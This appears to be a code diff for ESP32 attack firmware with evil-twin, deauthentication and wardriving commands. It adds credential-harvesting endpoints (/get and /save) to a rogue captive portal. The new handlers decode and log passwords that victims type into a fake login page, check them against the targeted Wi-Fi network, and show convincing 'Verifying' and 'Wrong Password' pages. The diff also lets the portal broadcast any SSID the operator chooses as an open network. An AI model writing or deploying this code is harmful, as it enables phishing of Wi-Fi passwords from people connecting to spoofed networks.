@@ -299,6 +299,8 @@ static void dns_server_task(void *pvParameters);
 static esp_err_t root_handler(httpd_req_t *req);
 static esp_err_t portal_handler(httpd_req_t *req);
 static esp_err_t login_handler(httpd_req_t *req);
+static esp_err_t get_handler(httpd_req_t *req);
+static esp_err_t save_handler(httpd_req_t *req);
 static esp_err_t android_captive_handler(httpd_req_t *req);
 static esp_err_t ios_captive_handler(httpd_req_t *req);
 static esp_err_t captive_detection_handler(httpd_req_t *req);
@@ -1665,6 +1667,22 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             };
             httpd_register_uri_handler(portal_server, &login_uri);
             
+            httpd_uri_t get_uri = {
+                .uri = "/get",
+                .method = HTTP_GET,
+                .handler = get_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &get_uri);
+            
+            httpd_uri_t save_uri = {
+                .uri = "/save",
+                .method = HTTP_POST,
+                .handler = save_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &save_uri);
+            
             httpd_uri_t android_captive_uri = {
                 .uri = "/generate_204",
                 .method = HTTP_GET,
@@ -2670,6 +2688,202 @@ static esp_err_t login_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+// HTTP handler for GET /get endpoint
+static esp_err_t get_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "GET handler called - URI: %s", req->uri);
+    
+    // Get query string
+    size_t query_len = httpd_req_get_url_query_len(req);
+    if (query_len > 0) {
+        char *query_string = malloc(query_len + 1);
+        if (query_string) {
+            if (httpd_req_get_url_query_str(req, query_string, query_len + 1) == ESP_OK) {
+                MY_LOG_INFO(TAG, "Received GET query: %s", query_string);
+                
+                // Parse password from query string
+                char password_param[64];
+                if (httpd_query_key_value(query_string, "password", password_param, sizeof(password_param)) == ESP_OK) {
+                    // URL decode the password
+                    char decoded_password[64];
+                    int decoded_len = 0;
+                    for (char *p = password_param; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
+                        if (*p == '%' && p[1] && p[2]) {
+                            char hex[3] = {p[1], p[2], '\0'};
+                            decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
+                            p += 2;
+                        } else if (*p == '+') {
+                            decoded_password[decoded_len++] = ' ';
+                        } else {
+                            decoded_password[decoded_len++] = *p;
+                        }
+                    }
+                    decoded_password[decoded_len] = '\0';
+                    
+                    // Log the password
+                    MY_LOG_INFO(TAG, "Portal password received (GET): %s", decoded_password);
+                    
+                    // If in evil twin mode, verify the password
+                    if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+                        verify_password(decoded_password);
+                    }
+                }
+            }
+            free(query_string);
+        }
+    }
+    
+    // Send response
+    const char* response;
+    if (last_password_wrong) {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Wrong Password</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
+            "a:hover { background: #0056b3; }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Wrong Password</h1>"
+            "<p>The password you entered is incorrect. Please try again.</p>"
+            "<a href='/portal'>Try Again</a>"
+            "</div>"
+            "</body></html>";
+    } else {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Processing</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
+            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Verifying...</h1>"
+            "<div class='spinner'></div>"
+            "<p>Please wait while we verify your credentials.</p>"
+            "</div>"
+            "</body></html>";
+    }
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// HTTP handler for POST /save endpoint
+static esp_err_t save_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Save handler called - URI: %s", req->uri);
+    
+    char buf[256];
+    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (ret <= 0) {
+        MY_LOG_INFO(TAG, "Failed to receive POST data");
+        return ESP_FAIL;
+    }
+    buf[ret] = '\0';
+    
+    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
+    
+    // Parse password from POST data
+    char *password_start = strstr(buf, "password=");
+    if (password_start) {
+        password_start += 9; // Skip "password="
+        char *password_end = strchr(password_start, '&');
+        if (password_end) {
+            *password_end = '\0';
+        }
+        
+        // URL decode the password
+        char decoded_password[64];
+        int decoded_len = 0;
+        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
+            if (*p == '%' && p[1] && p[2]) {
+                char hex[3] = {p[1], p[2], '\0'};
+                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
+                p += 2;
+            } else if (*p == '+') {
+                decoded_password[decoded_len++] = ' ';
+            } else {
+                decoded_password[decoded_len++] = *p;
+            }
+        }
+        decoded_password[decoded_len] = '\0';
+        
+        // Log the password
+        MY_LOG_INFO(TAG, "Portal password received (SAVE): %s", decoded_password);
+        
+        // If in evil twin mode, verify the password
+        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+            verify_password(decoded_password);
+        }
+    }
+    
+    // Send response
+    const char* response;
+    if (last_password_wrong) {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Wrong Password</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
+            "a:hover { background: #0056b3; }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Wrong Password</h1>"
+            "<p>The password you entered is incorrect. Please try again.</p>"
+            "<a href='/portal'>Try Again</a>"
+            "</div>"
+            "</body></html>";
+    } else {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Processing</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
+            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Verifying...</h1>"
+            "<div class='spinner'></div>"
+            "<p>Please wait while we verify your credentials.</p>"
+            "</div>"
+            "</body></html>";
+    }
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
 // HTTP handler for portal page
 static esp_err_t portal_handler(httpd_req_t *req) {
     MY_LOG_INFO(TAG, "Portal page accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
@@ -2954,7 +3168,12 @@ static void dns_server_task(void *pvParameters) {
 
 // Start portal command
 static int cmd_start_portal(int argc, char **argv) {
-    (void)argc; (void)argv;
+    // Check for SSID argument
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: start_portal <SSID>");
+        MY_LOG_INFO(TAG, "Example: start_portal MyWiFi");
+        return 1;
+    }
     
     // Check if portal is already running
     if (portal_active) {
@@ -2962,7 +3181,16 @@ static int cmd_start_portal(int argc, char **argv) {
         return 0;
     }
     
-    MY_LOG_INFO(TAG, "Starting captive portal...");
+    const char *ssid = argv[1];
+    size_t ssid_len = strlen(ssid);
+    
+    // Validate SSID length (WiFi SSID max is 32 characters)
+    if (ssid_len == 0 || ssid_len > 32) {
+        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "Starting captive portal with SSID: %s", ssid);
     
     // Get AP netif and stop DHCP to configure custom IP
     esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
@@ -2988,17 +3216,14 @@ static int cmd_start_portal(int argc, char **argv) {
     
     MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
     
-    // Configure AP
-    wifi_config_t ap_config = {
-        .ap = {
-            .ssid = "Portal",
-            .ssid_len = 6,
-            .channel = 1,
-            .password = "",
-            .max_connection = 4,
-            .authmode = WIFI_AUTH_OPEN
-        }
-    };
+    // Configure AP with provided SSID
+    wifi_config_t ap_config = {0};
+    memcpy(ap_config.ap.ssid, ssid, ssid_len);
+    ap_config.ap.ssid_len = ssid_len;
+    ap_config.ap.channel = 1;
+    ap_config.ap.password[0] = '\0';
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
     
     // Start AP
     ret = esp_wifi_set_mode(WIFI_MODE_AP);
@@ -3083,6 +3308,24 @@ static int cmd_start_portal(int argc, char **argv) {
         .user_ctx = NULL
     };
     httpd_register_uri_handler(portal_server, &login_uri);
+    
+    // GET handler
+    httpd_uri_t get_uri = {
+        .uri = "/get",
+        .method = HTTP_GET,
+        .handler = get_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &get_uri);
+    
+    // Save handler
+    httpd_uri_t save_uri = {
+        .uri = "/save",
+        .method = HTTP_POST,
+        .handler = save_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &save_uri);
     
     // Android captive portal detection
     httpd_uri_t android_captive_uri = {
@@ -3173,9 +3416,9 @@ static int cmd_start_portal(int argc, char **argv) {
     MY_LOG_INFO(TAG, "DNS server task started");
     
     MY_LOG_INFO(TAG, "Captive portal started successfully!");
-    MY_LOG_INFO(TAG, "AP Name: Portal");
+    MY_LOG_INFO(TAG, "AP Name: %s", ssid);
     MY_LOG_INFO(TAG, "AP IP: 172.0.0.1");
-    MY_LOG_INFO(TAG, "Connect to 'Portal' WiFi network to access the portal");
+    MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the portal", ssid);
     MY_LOG_INFO(TAG, "DNS server running on port 53 - all queries redirect to 172.0.0.1");
     MY_LOG_INFO(TAG, "HTTP server running on port 80");
     
@@ -3297,7 +3540,7 @@ static void register_commands(void)
 
     const esp_console_cmd_t portal_cmd = {
         .command = "start_portal",
-        .help = "Starts captive portal with password form",
+        .help = "Starts captive portal with password form: start_portal <SSID>",
         .hint = NULL,
         .func = &cmd_start_portal,
         .argtable = NULL
@@ -3421,7 +3664,7 @@ void app_main(void) {
     MY_LOG_INFO(TAG,"  sae_overflow");
     MY_LOG_INFO(TAG,"  start_blackout");
     MY_LOG_INFO(TAG,"  start_wardrive");
-    MY_LOG_INFO(TAG,"  start_portal");
+    MY_LOG_INFO(TAG,"  start_portal <SSID>");
     MY_LOG_INFO(TAG,"  list_sd");
     MY_LOG_INFO(TAG,"  select_html <index>");
     MY_LOG_INFO(TAG,"  start_sniffer");
